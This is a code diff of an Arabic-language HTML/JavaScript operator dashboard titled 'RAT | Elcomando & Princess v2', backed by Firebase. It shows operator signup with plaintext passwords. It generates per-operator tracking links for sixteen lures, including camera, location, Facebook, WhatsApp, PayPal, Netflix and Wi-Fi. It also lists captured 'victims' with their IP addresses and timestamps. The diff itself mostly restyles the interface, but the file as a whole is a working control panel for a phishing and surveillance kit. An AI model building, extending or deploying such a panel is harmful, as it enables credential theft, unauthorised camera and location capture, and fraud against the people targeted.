@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title> RAT | Elcomando & Princess v¹</title>
+    <title>RAT | Elcomando & Princess v2</title>
     
-    <script src="firebase-app.js"></script>
-    <script src="firebase-database.js"></script>
-    <link rel="stylesheet" href="all.min.css">
+    <script src="js/firebase-app.js"></script>
+    <script src="js/firebase-database.js"></script>
+    <link rel="stylesheet" href="css/all.min.css">
 
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@600;900&family=Noto+Kufi+Arabic:wght@400;700&display=swap');
@@ -21,7 +21,7 @@
 
         body, html { margin: 0; padding: 0; background: var(--bg); color: white; font-family: 'Noto Kufi Arabic', sans-serif; overflow: hidden; height: 100vh; }
 
-        /* لودر 3 ثواني */
+        /* لودر التنقل */
         #page-loader {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.95); z-index: 9999;
@@ -30,93 +30,145 @@
         .spinning-emoji { font-size: 70px; animation: rotate 1s infinite linear; filter: drop-shadow(0 0 15px var(--primary)); }
         @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
-        /* ستايل الصفحات والكروت */
+        /* الديلوج الموحد والجديد */
+        .custom-dialog-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); backdrop-filter: blur(5px);
+            display: none; align-items: center; justify-content: center; z-index: 10000;
+        }
+        .custom-dialog-box {
+            width: 85%; max-width: 320px; background: #0a0a0a;
+            border: 2px solid var(--primary); border-radius: 20px;
+            padding: 25px; text-align: center; box-shadow: var(--neon-glow);
+            animation: zoomIn 0.3s ease;
+        }
+
+        /* الهيدر */
+        .header { height: 65px; background: rgba(0,0,0,0.9); border-bottom: 2px solid var(--primary); display: flex; align-items: center; padding: 0 20px; position: fixed; top: 0; width: 100%; box-sizing: border-box; z-index: 1000; }
+        .header h1 { font-family: 'Orbitron'; font-size: 16px; color: var(--primary); text-shadow: 0 0 10px var(--primary); margin: 0; flex: 1; }
+
         .viewport { margin-top: 75px; height: calc(100vh - 165px); overflow-y: auto; padding: 15px; }
         .page { display: none; }
         .page.active { display: block; animation: zoomIn 0.3s ease; }
         @keyframes zoomIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
 
-        .tool-card { background: var(--surface); border: 1px solid #1a1a1a; border-right: 4px solid var(--primary); padding: 15px; border-radius: 12px; text-align: center; margin-bottom: 10px; }
+        /* ستايل الكروت والروابط */
+        .links-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
+        .tool-card { 
+            background: var(--surface); border: 1px solid #1a1a1a; border-right: 4px solid var(--primary);
+            padding: 15px; border-radius: 12px; text-align: center; cursor: pointer; transition: 0.3s;
+        }
         
-        input { width: 100%; background: #000; border: 1px solid var(--primary); padding: 14px; border-radius: 10px; color: white; margin-bottom: 10px; text-align: center; box-sizing: border-box; outline: none; }
-        .btn { width: 100%; background: var(--primary); color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: 900; cursor: pointer; transition: 0.3s; }
-        
-        /* الزرار اللي بينور (Neon Pulse) */
+        /* الزرار النيون النابض */
         .btn-neon {
-            background: #000; color: var(--primary); border: 2px solid var(--primary);
+            background: transparent; color: var(--primary); border: 2px solid var(--primary);
             box-shadow: 0 0 10px var(--primary); animation: pulse 1.5s infinite;
         }
         @keyframes pulse { 0% { box-shadow: 0 0 5px var(--primary); } 50% { box-shadow: 0 0 20px var(--primary); } 100% { box-shadow: 0 0 5px var(--primary); } }
 
-        /* الناف بار */
-        .bottom-nav { position: fixed; bottom: 0; width: 100%; height: 90px; background: #000; border-top: 2px solid var(--primary); display: flex; align-items: center; justify-content: space-around; z-index: 1000; }
-        .nav-item { color: #444; text-align: center; flex: 1; }
-        .nav-item.active { color: var(--primary); }
+        input { width: 100%; background: #000; border: 1px solid var(--primary); padding: 14px; border-radius: 10px; color: white; margin-bottom: 10px; text-align: center; box-sizing: border-box; outline: none; }
+        .btn { width: 100%; background: var(--primary); color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: 900; cursor: pointer; transition: 0.3s; }
 
-        /* القائمة (ListView) */
-        .list-item { background: #111; border: 1px solid #222; padding: 10px; border-radius: 8px; margin-bottom: 8px; font-size: 12px; display: flex; justify-content: space-between; align-items: center; }
+        /* الناف بار السفلي */
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; height: 90px; background: #000; border-top: 2px solid var(--primary); display: flex; align-items: center; justify-content: space-around; z-index: 1000; }
+        .nav-item { color: #444; text-align: center; flex: 1; transition: 0.3s; }
+        .nav-item.active { color: var(--primary); text-shadow: 0 0 10px var(--primary); }
     </style>
 </head>
 <body>
 
     <div id="page-loader">
         <div class="spinning-emoji" id="loader-icon">⚙️</div>
-        <p style="color:var(--primary); font-family:Orbitron; margin-top:15px;">WAITING FOR SERVER...</p>
+        <p style="color:var(--primary); font-family:Orbitron; margin-top:15px;">WAITING...</p>
+    </div>
+
+    <div id="acc-dialog" class="custom-dialog-overlay">
+        <div class="custom-dialog-box">
+            <div class="dialog-icon">🎉</div>
+            <h3 style="color:var(--primary); font-family:Orbitron;">ACCOUNT READY</h3>
+            <p style="font-size:12px; color:#666;">اضغط على البيانات لنسخها</p>
+            <div onclick="copyInfo(this, 'Username')" id="copy-u" class="tool-card" style="margin:10px 0; border:1px dashed var(--primary)">
+                <small>User:</small> <b style="color:var(--primary)" id="res-u"></b>
+            </div>
+            <div onclick="copyInfo(this, 'Password')" id="copy-p" class="tool-card" style="margin:10px 0; border:1px dashed var(--primary)">
+                <small>Pass:</small> <b style="color:var(--primary)" id="res-p"></b>
+            </div>
+            <button class="btn" onclick="closeAccDialog()">دخول للنظام 🚀</button>
+        </div>
+    </div>
+
+    <div id="custom-alert" class="custom-dialog-overlay">
+        <div class="custom-dialog-box">
+            <div id="alert-icon" class="dialog-icon">⚠️</div>
+            <h3 id="alert-title" style="color: var(--primary); font-family: Orbitron;">TIPS</h3>
+            <p id="alert-msg" style="font-size: 14px; color: #ccc;"></p>
+            <button class="btn" onclick="closeAlert()">حسناً 👍</button>
+        </div>
     </div>
 
     <div id="auth-screen" style="height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px;">
-        <div class="tool-card" style="width: 100%; max-width: 350px;">
-            <img src="Elcomando.png" style="width: 60px; filter: drop-shadow(0 0 10px var(--primary)); margin-bottom: 10px;">
+        <div class="tool-card" style="width: 100%; max-width: 350px; border-right: none; border-top: 4px solid var(--primary);">
+            <img src="Elcomando.png" style="width: 65px; filter: drop-shadow(0 0 10px var(--primary)); margin-bottom: 15px;">
             <div id="login-box">
                 <input type="text" id="loginUser" placeholder="اسم المستخدم">
                 <input type="password" id="loginPass" placeholder="كلمة المرور">
-                <button class="btn" onclick="handleAuth('login')">دخول 🔓</button>
-                <p onclick="toggleAuth(true)" style="font-size: 11px; margin-top: 15px; color: var(--primary); cursor:pointer;">إنشاء حساب جديد</p>
+                <button class="btn" onclick="handleAuth('login')">دخول السيرفر 🔓</button>
+                <p onclick="toggleAuth(true)" style="font-size: 11px; margin-top: 15px; color: var(--primary); cursor: pointer;">إنشاء حساب جديد</p>
             </div>
             <div id="signup-box" style="display: none;">
-                <input type="text" id="regUser" placeholder="اسم مستعار جديد">
-                <input type="password" id="regPass" placeholder="كلمة مرور قوية">
-                <button class="btn" onclick="handleAuth('signup')">إنشاء ونسخ البيانات 🛠️</button>
-                <p onclick="toggleAuth(false)" style="font-size: 11px; margin-top: 15px; color: var(--primary); cursor:pointer;">لديك حساب؟ دخول</p>
+                <input type="text" id="regUser" placeholder="اكتب يوزر جديد">
+                <input type="password" id="regPass" placeholder="اكتب باسورد">
+                <button class="btn" onclick="handleAuth('signup')">إنشاء وحفظ الحساب 🛠️</button>
+                <p onclick="toggleAuth(false)" style="font-size: 11px; margin-top: 15px; color: var(--primary); cursor: pointer;">لديك حساب بالفعل؟ دخول</p>
             </div>
         </div>
     </div>
 
     <div id="main-panel" style="display: none;">
-        <header style="height: 65px; background: #000; border-bottom: 2px solid var(--primary); display: flex; align-items: center; padding: 0 20px; position: fixed; top: 0; width: 100%; z-index: 1000;">
-            <h1 id="title" style="font-family: Orbitron; font-size: 16px; color: var(--primary); margin: 0;">LINKS</h1>
+        <header class="header">
+            <h1 id="title">LINKS</h1>
+            <i class="fas fa-spider" style="color: var(--primary);"></i>
         </header>
 
         <div class="viewport">
             <div id="tab1" class="page active">
-                <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px;" id="tools-grid">
+                <div class="links-grid" id="main-grid">
                     </div>
             </div>
 
             <div id="tool-details-page" class="page">
-                <div class="tool-card" style="height: 250px; overflow-y: auto;" id="victim-list">
-                    <p style="color: #444;">في انتظار الضحايا... 🕷️</p>
+                <div class="tool-card" style="height: 250px; overflow-y: auto; text-align: right;" id="victim-list">
+                    <p style="color: #444; text-align: center; margin-top: 100px;">في انتظار الضحايا... 🕷️</p>
                 </div>
-                <div style="margin-top: 20px;">
-                    <p id="tool-link-display" style="font-size: 10px; color: var(--primary); text-align: center; word-break: break-all;"></p>
+                <div style="margin-top: 20px; text-align: center;">
+                    <p id="tool-link-display" style="font-size: 10px; color: var(--primary); word-break: break-all; margin-bottom: 10px;"></p>
                     <button class="btn btn-neon" id="copy-tool-btn">نسخ الرابط واليوزر 📋</button>
                     <button class="btn" style="margin-top: 10px; background: #222; color: #fff;" onclick="nav(1, 'LINKS', '🔗', null)">رجوع للروابط 🔙</button>
                 </div>
             </div>
 
-            <div id="tab3" class="page"> <div class="tool-card"><h3>الجلسات النشطة</h3></div> </div>
-            <div id="tab4" class="page"> 
-                <div class="tool-card">
-                    <h3 id="profile-name">User</h3>
-                    <button class="btn" onclick="logout()">خروج</button>
-                </div> 
+            <div id="tab3" class="page">
+                <div id="Elcomando-container" style="text-align: center; color: #444; margin-top: 50px;">
+                    <i class="fas fa-spider fa-3x"></i>
+                    <p>استخدم صفحة الروابط لمتابعة كل أداة</p>
+                </div>
+            </div>
+
+            <div id="tab4" class="page">
+                <div class="tool-card" style="text-align: right; border-right: 4px solid var(--primary);">
+                    <small style="color: #666;">اسم العميل:</small>
+                    <h2 id="set-username" style="margin: 0; color: var(--primary);">User</h2>
+                    <br>
+                    <button class="btn" onclick="showAlert('نجاح', 'تم التحديث')">تحديث البيانات 🔄</button>
+                    <button class="btn" style="background: #ff1a1a; margin-top: 10px;" onclick="logout()">خروج 🚪</button>
+                </div>
             </div>
         </div>
 
         <nav class="bottom-nav">
             <div class="nav-item active" onclick="nav(1, 'LINKS', '🔗', this)"><i class="fas fa-link"></i><br><span>الروابط</span></div>
-            <div class="nav-item" onclick="nav(3, 'SESSIONS', '🕷️', this)"><i class="fas fa-spider"></i><br><span>الجلسات</span></div>
-            <div class="nav-item" onclick="nav(4, 'SETTINGS', '⚙️', this)"><i class="fas fa-cog"></i><br><span>الاعدادات</span></div>
+            <div class="nav-item" onclick="nav(3, 'SESSIONS', '☠️', this)"><i class="fas fa-spider"></i><br><span>الجلسات</span></div>
+            <div class="nav-item" onclick="nav(4, 'SETTINGS', '⚙️', this)"><i class="fas fa-cog"></i><br><span>الإعدادات</span></div>
         </nav>
     </div>
 
@@ -125,54 +177,41 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        function toggleAuth(isSignup) {
-            document.getElementById('login-box').style.display = isSignup ? 'none' : 'block';
-            document.getElementById('signup-box').style.display = isSignup ? 'block' : 'none';
-        }
-
+        // 1. نظام الدخول والباسورد وقفل الجهاز
         async function handleAuth(type) {
+            const loader = document.getElementById('page-loader');
             if(type === 'signup') {
-                if(localStorage.getItem('has_account')) return alert("عذراً! يسمح بإنشاء حساب واحد فقط لكل جهاز.");
-                const u = document.getElementById('regUser').value;
-                const p = document.getElementById('regPass').value;
-                if(!u || !p) return alert("اكمل البيانات");
+                if(localStorage.getItem('device_locked')) return showAlert("تنبيه", "يسمح بحساب واحد فقط لكل هاتف 🚫");
+                const u = document.getElementById('regUser').value.trim();
+                const p = document.getElementById('regPass').value.trim();
+                if(!u || !p) return showAlert("نقص بيانات", "اكمل اليوزر والباسورد");
                 
+                loader.style.display = 'flex';
                 await db.ref('users/' + u).set({ password: p, username: u });
-                localStorage.setItem('has_account', 'true');
+                localStorage.setItem('device_locked', 'true');
+                loader.style.display = 'none';
                 
-                // نسخ البيانات تلقائياً
-                const info = `User: ${u}\nPass: ${p}`;
-                navigator.clipboard.writeText(info);
-                alert("تم إنشاء الحساب ونسخ بيانات الدخول (User & Pass) تلقائياً! ✅");
-                toggleAuth(false);
+                document.getElementById('res-u').innerText = u;
+                document.getElementById('res-p').innerText = p;
+                document.getElementById('acc-dialog').style.display = 'flex';
             } else {
-                const u = document.getElementById('loginUser').value;
-                const p = document.getElementById('loginPass').value;
+                const u = document.getElementById('loginUser').value.trim();
+                const p = document.getElementById('loginPass').value.trim();
+                loader.style.display = 'flex';
                 const snap = await db.ref('users/' + u).once('value');
                 if(snap.exists() && snap.val().password === p) {
                     localStorage.setItem('logged_user', u);
                     enterSystem();
-                } else { alert("خطأ في اليوزر أو الباسورد"); }
+                } else { showAlert("خطأ", "بيانات الدخول غير صحيحة"); }
+                loader.style.display = 'none';
             }
         }
 
-        function nav(id, title, emoji, el) {
-            const loader = document.getElementById('page-loader');
-            loader.style.display = 'flex';
-            setTimeout(() => {
-                loader.style.display = 'none';
-                document.getElementById('title').innerText = title;
-                document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-                const target = id === 'tool' ? 'tool-details-page' : 'tab' + id;
-                document.getElementById(target).classList.add('active');
-            }, 3000);
-        }
-
-        // إنشاء الـ 16 زرار
+        // 2. نظام الـ 16 زرار والصفحات الداخلية
         const tools = ["كاميرا", "موقع", "فيسبوك", "انستا", "واتساب", "تيك توك", "ببجي", "فري فاير", "سناب", "تلجرام", "نتفليكس", "باي بال", "واي فاي", "تويتر", "درايف", "أمان"];
-        const grid = document.getElementById('tools-grid');
+        const grid = document.getElementById('main-grid');
         tools.forEach(t => {
-            grid.innerHTML += `<div class="tool-card" onclick="openToolPage('${t}')"><span>${t}</span></div>`;
+            grid.innerHTML += `<div class="tool-card" onclick="openToolPage('${t}')"><i class="fas fa-microchip"></i><br><span>${t}</span></div>`;
         });
 
         function openToolPage(name) {
@@ -180,31 +219,63 @@
             const link = `https://elcomando-68116.web.app/${name}?id=${user}`;
             document.getElementById('tool-link-display').innerText = link;
             document.getElementById('copy-tool-btn').onclick = () => {
-                navigator.clipboard.writeText(`الرابط: ${link}\nالمستخدم: ${user}`);
-                alert("تم نسخ الرابط وبيانات المستخدم ✅");
+                navigator.clipboard.writeText(`الرابط: ${link}\nاليوزر: ${user}`);
+                showAlert("تم النسخ", "تم نسخ الرابط واليوزر بنجاح ✅");
             };
-            nav('tool', name.toUpperCase(), '⚙️', null);
-            loadVictims(name);
+            nav('tool', name, '⚙️', null);
+            loadVictims(name, user);
         }
 
-        function loadVictims(toolName) {
-            const user = localStorage.getItem('logged_user');
-            db.ref('hits/' + user + '/' + toolName).on('value', snap => {
+        function loadVictims(tool, user) {
+            db.ref('hits/' + user + '/' + tool).on('value', snap => {
                 const list = document.getElementById('victim-list');
                 list.innerHTML = "";
+                if(!snap.exists()) list.innerHTML = "<p style='text-align:center; margin-top:100px;'>لا يوجد ضحايا لهذه الأداة</p>";
                 snap.forEach(child => {
-                    const data = child.val();
-                    list.innerHTML += `<div class="list-item"><span>📱 ${data.ip || 'Unknown'}</span><span>${data.time || ''}</span></div>`;
+                    const d = child.val();
+                    list.innerHTML += `<div style="padding:10px; border-bottom:1px solid #222; font-size:12px;">📱 IP: ${d.ip || '0.0.0.0'}<br>📅 ${d.time || ''}</div>`;
                 });
             });
+        }
+
+        // 3. الدوال المساعدة
+        function copyInfo(el, type) {
+            const text = el.querySelector('b').innerText;
+            navigator.clipboard.writeText(text);
+            showAlert("نسخ", "تم نسخ الـ " + type);
+        }
+
+        function closeAccDialog() { document.getElementById('acc-dialog').style.display = 'none'; toggleAuth(false); }
+
+        function nav(id, title, emoji, el) {
+            const loader = document.getElementById('page-loader');
+            document.getElementById('loader-icon').innerText = emoji;
+            loader.style.display = 'flex';
+            setTimeout(() => {
+                loader.style.display = 'none';
+                document.getElementById('title').innerText = title;
+                document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+                const target = id === 'tool' ? 'tool-details-page' : 'tab' + id;
+                document.getElementById(target).classList.add('active');
+            }, 1500);
         }
 
         function enterSystem() {
             document.getElementById('auth-screen').style.display = 'none';
             document.getElementById('main-panel').style.display = 'block';
-            document.getElementById('profile-name').innerText = localStorage.getItem('logged_user');
+            document.getElementById('set-username').innerText = localStorage.getItem('logged_user');
         }
 
+        function showAlert(title, msg) {
+            document.getElementById('alert-title').innerText = title;
+            document.getElementById('alert-msg').innerText = msg;
+            document.getElementById('custom-alert').style.display = 'flex';
+        }
+        function closeAlert() { document.getElementById('custom-alert').style.display = 'none'; }
+        function toggleAuth(s) {
+            document.getElementById('login-box').style.display = s ? 'none' : 'block';
+            document.getElementById('signup-box').style.display = s ? 'block' : 'none';
+        }
         function logout() { localStorage.clear(); location.reload(); }
         window.onload = () => { if(localStorage.getItem('logged_user')) enterSystem(); };
     </script>
